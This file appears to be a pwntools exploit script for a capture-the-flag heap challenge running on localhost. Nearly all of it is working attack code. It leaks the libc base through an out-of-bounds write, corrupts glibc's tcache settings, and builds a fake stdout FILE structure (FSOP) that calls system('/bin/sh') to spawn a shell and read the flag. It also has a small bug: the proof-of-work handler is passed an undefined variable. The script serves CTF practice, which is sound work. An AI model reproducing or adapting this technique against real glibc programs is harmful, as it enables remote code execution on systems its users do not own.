#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

from pwn import *
import time

context.binary = elf = ELF("./vuln")
libc = ELF("./libc.so.6")
for n in range(10):
    try:
        conn = remote('127.0.0.1', 1337)
        print(conn.recvuntil(b'== proof-of-work: '))
        if conn.recvline().startswith(b'enabled'):
            handle_pow(r)

        def create(size, content):
            conn.sendline(b'1')
            conn.sendline(str(size).encode())
            conn.sendline(content)

        def delete():
            conn.sendline(b'2')

        def multiply(item):
            conn.sendline(b'3')
            conn.sendline(str(item).encode())

        def exit_program():
            conn.sendline(b'4')

        #import sys
        #o = 0x1000 * int(sys.argv[1])
        o = 0x1000 * -3 # offset in docker is different from local

        create(0x100000, b"snailz")
        multiply(0x3055b0 - o + 5*8)

        conn.recvuntil(b"\0\0\0\0")
        libc.address = u64(conn.recv(8)) - 0x205710
        info("libc @ " + hex(libc.address))
        multiply(0x3041d8 - o) # mp_.tcache_bins

        # FSOP RCE
        stdout_lock = libc.address + 0x205710   # _IO_stdfile_1_lock  (symbol not exported)
        stdout = libc.sym['_IO_2_1_stdout_']
        fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
        gadget = libc.address + 0x00000000001724f0 # add rdi, 0x10 ; jmp rcx

        fake = FileStructure(0)
        fake.flags = 0x3b01010101010101
        fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
        fake._IO_save_base = gadget
        fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
        fake._lock=stdout_lock
        fake._codecvt= stdout + 0xb8
        fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
        fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

        create(0x40, b"asdf")
        delete() # fill the tcache index
        create(0x100, p64(libc.sym['_IO_2_1_stdout_'])) # make new tcache chunks
        create(0x4d0, bytes(fake)) # get my chunk back
        conn.sendline(b"cat flag.txt; exit")
        res = conn.recvall(timeout=1)
        if b"ictf{" in res:
            exit(0)
    except Exception as e:
        print(e)

exit(1)
